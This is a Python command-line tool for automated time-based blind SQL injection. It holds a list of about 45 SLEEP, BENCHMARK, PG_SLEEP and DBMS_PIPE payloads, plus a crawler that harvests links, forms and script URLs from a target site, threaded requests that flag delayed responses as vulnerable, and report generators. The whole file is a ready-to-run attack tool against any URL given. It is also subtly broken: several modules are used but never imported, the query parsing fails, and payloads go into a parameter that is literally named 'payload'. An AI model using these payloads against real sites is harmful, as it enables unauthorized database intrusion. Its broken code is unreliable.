import requests
import argparse
import time
from urllib.parse import urljoin, urlparse, urlencode
from bs4 import BeautifulSoup
import threading
import re

TIME_BASED_XOR_PAYLOADS = [
    "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X",
    "0\"XOR(if(now()=sysdate(),sleep(10),0))XOR\"Z",
    "' AND (SELECT 8839 FROM (SELECT(SLEEP(5)))uzIY) AND 'mSUA'='mSUA",
    "'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
    "X'XOR(if(now()=sysdate(),/**/sleep(5)/**/,0))XOR'X",
    "X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X",
    "X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X",
    "'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z",
    "(SELECT(0)FROM(SELECT(SLEEP(6)))a)",
    "'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
    "'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'",
    "1 AND (SELECT(0)FROM(SELECT(SLEEP(9)))a)-- wXyW",
    "(SELECT * FROM (SELECT(SLEEP(5)))a)",
    "'%2b(select*from(select(sleep(5)))a)%2b'",
    "CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END",
    "';(SELECT 4564 FROM PG_SLEEP(5))--",
    "[')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23']",
    "DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20'bar'='bar",
    "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar",
    "1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK",
    "(select*from(select(sleep(20)))a)",
    "'%2b(select*from(select(sleep(0)))a)%2b'",
    "*'XOR(if(2=2,sleep(10),0))OR'",
    "-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//",
    "'+(select*from(select(if(1=1,sleep(20),false)))a)+'",
    "2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)",
    "BENCHMARK(10000000,MD5(CHAR(116)))",
    "'%2bbenchmark(10000000%2csha1(1))%2b'",
    "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
    "0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
    "if(now()=sysdate(),sleep(5),0)",
    "'XOR(if(now()=sysdate(),sleep(5),0))XOR'",
    "'XOR(if(now()=sysdate(),sleep(5*1),0))OR'",
    "0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z",
    "0'or(now()=sysdate()&&SLEEP(1))or'Z",
    "if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5),0))OR'",
    "'XOR(if(now()=sysdate(),sleep(5),0))OR'\"XOR(if(now()=sysdate(),sleep(5),0))OR\"",
    "if(1=1,sleep(5),0)/*'XOR(if(1=1,sleep(5),0))OR'",
    "SLEEP(5)/*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",
    "XOR(if(1337=1337,sleep(5),0))OR\"",
    "0%27XOR(if(now()=sysdate(),sleep(9),0))XOR%27Z",
    "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar",
    "(select(0)from(select(sleep(5)))v)%2f",
    "'(select(0)from(select(sleep(5)))v)",
    "'+\"+(select(0)from(select(sleep(5)))v)+\"*/'"
]

class TimeBasedSQLiTester:
    def __init__(self, config):
        self.config = config
        self.results = []
        self.lock = threading.Lock()

    def test_payload(self, url, payload):
        try:
            # Parse the base URL
            parsed_url = urlparse(url)
            query = dict(parsed_url.query.split('&'))
            # Append the payload as a query parameter
            query['payload'] = payload
            encoded_query = urlencode(query)
            full_url = parsed_url._replace(query=encoded_query).geturl()
            
            start_time = time.time()
            r = requests.get(full_url, cookies=self.config.cookies, headers={'User-Agent': self.config.user_agent}, proxies=self.config.proxies, timeout=self.config.timeout)
            response_time = time.time() - start_time
            vulnerable = response_time > self.config.sleep_time
            
            with self.lock:
                self.results.append({
                    'url': full_url,
                    'payload': payload,
                    'vulnerable': vulnerable,
                    'response_time': response_time,
                    'status_code': r.status_code,
                    'content_length': len(r.content)
                })
        except requests.exceptions.RequestException as e:
            print(f"Request to {url} failed: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")

    def run(self):
        urls_to_test = [self.config.url] if not self.config.crawl else self.crawl(self.config.url)
        for url in urls_to_test:
            threads = []
            for payload in TIME_BASED_XOR_PAYLOADS:
                thread = threading.Thread(target=self.test_payload, args=(url, payload))
                threads.append(thread)
                thread.start()
                time.sleep(self.config.delay)  # Delay between starting threads

            for thread in threads:
                thread.join()

    def crawl(self, base_url):
        urls = set([base_url])
        try:
            r = requests.get(base_url, headers={'User-Agent': self.config.user_agent}, timeout=self.config.timeout)
            soup = BeautifulSoup(r.text, 'html.parser')

            # Find all links
            for link in soup.find_all(['a', 'link'], href=True):
                href = link['href']
                full_url = urljoin(base_url, href)
                if base_url in full_url and full_url not in urls:
                    urls.add(full_url)

            # Find all forms and extract action URLs
            for form in soup.find_all('form'):
                action = form.get('action')
                form_url = urljoin(base_url, action)
                if base_url in form_url and form_url not in urls:
                    urls.add(form_url)

                # Extract form parameters
                inputs = form.find_all('input')
                params = {}
                for inp in inputs:
                    name = inp.get('name')
                    value = inp.get('value', '')
                    if name:
                        params[name] = value
                if params:
                    urls.add(self.add_params_to_url(form_url, params))

            # Extract parameters from JavaScript
            script_tags = soup.find_all('script')
            for script in script_tags:
                js_code = script.string
                if js_code:
                    urls.update(self.extract_js_urls(js_code, base_url))

        except requests.exceptions.RequestException as e:
            print(f"Failed to crawl {base_url}: {e}")
        return list(urls)

    def extract_js_urls(self, js_code, base_url):
        js_urls = set()
        url_patterns = re.findall(r"""(https?://[^\s'"]+|[^\s'"]+/\w+\.php\?\w+=\w+)""", js_code)
        for pattern in url_patterns:
            full_url = urljoin(base_url, pattern)
            if base_url in full_url:
                js_urls.add(full_url)
        return js_urls

    def add_params_to_url(self, url, params):
        url_parts = list(urlparse(url))
        query = dict(parse_qs(url_parts[4]))
        query.update(params)
        url_parts[4] = '&'.join([f"{key}={quote(value)}" for key, value in query.items()])
        return urljoin(url, url_parts[2] + '?' + url_parts[4])

    def display_results(self):
        for result in self.results:
            status = "Vulnerable" if result['vulnerable'] else "Not Vulnerable"
            print(f"URL: {result['url']} | Payload: {result['payload']} | Status: {status} | Response Time: {result['response_time']}s | Status Code: {result['status_code']} | Content Length: {result['content_length']}")

        if self.config.generate_csv:
            self.generate_csv_report()
        if self.config.generate_json:
            self.generate_json_report()
        if self.config.generate_html:
            self.generate_html_report()

    def generate_csv_report(self):
        csv_file = 'sqli_results.csv'
        with open(csv_file, mode='w', newline='') as file:
            writer = csv.DictWriter(file, fieldnames=self.results[0].keys())
            writer.writeheader()
            for result in self.results:
                writer.writerow(result)
        print(f"CSV report generated: {csv_file}")

    def generate_json_report(self):
        json_file = 'sqli_results.json'
        with open(json_file, 'w') as file:
            json.dump(self.results, file, indent=4)
        print(f"JSON report generated: {json_file}")

    def generate_html_report(self):
        html_file = 'sqli_results.html'
        with open(html_file, 'w') as file:
            file.write("<html><head><title>SQLi Test Results</title></head><body>")
            file.write("<h1>SQL Injection Test Results</h1>")
            file.write("<table border='1'><tr><th>URL</th><th>Payload</th><th>Vulnerable</th><th>Response Time (s)</th><th>Status Code</th><th>Content Length</th></tr>")
            for result in self.results:
                color = 'red' if result['vulnerable'] else 'green'
                file.write(f"<tr style='color:{color}'><td>{result['url']}</td><td>{result['payload']}</td><td>{result['vulnerable']}</td><td>{result['response_time']:.2f}</td><td>{result['status_code']}</td><td>{result['content_length']}</td></tr>")
            file.write("</table></body></html>")
        print(f"HTML report generated: {html_file}")

class Config:
    def __init__(self, args):
        self.url = args.url
        self.sleep_time = args.sleep_time
        self.delay = args.delay
        self.timeout = args.timeout
        self.user_agent = args.user_agent
        self.cookies = {}
        self.proxies = {}
        self.crawl = args.crawl
        self.generate_csv = args.generate_csv
        self.generate_json = args.generate_json
        self.generate_html = args.generate_html

    def validate(self):
        parsed_url = urlparse(self.url)
        if not parsed_url.scheme or not parsed_url.netloc:
            raise ValueError("Invalid URL format")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Time-Based SQL Injection Testing Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--sleep-time", type=int, default=5, help="Time to sleep for detection (in seconds)")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between requests (in seconds)")
    parser.add_argument("-to", "--timeout", type=float, default=10.0, help="Request timeout (in seconds)")
    parser.add_argument("-ua", "--user-agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64)", help="User-Agent header")
    parser.add_argument("-c", "--crawl", action="store_true", help="Crawl the website for more URLs")
    parser.add_argument("--generate-csv", action="store_true", help="Generate CSV report")
    parser.add_argument("--generate-json", action="store_true", help="Generate JSON report")
    parser.add_argument("--generate-html", action="store_true", help="Generate HTML report")
    args = parser.parse_args()

    config = Config(args)
    try:
        config.validate()  # Validate inputs
        tester = TimeBasedSQLiTester(config)
        tester.run()
        tester.display_results()
    except ValueError as ve:
        print(f"Input validation error: {ve}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
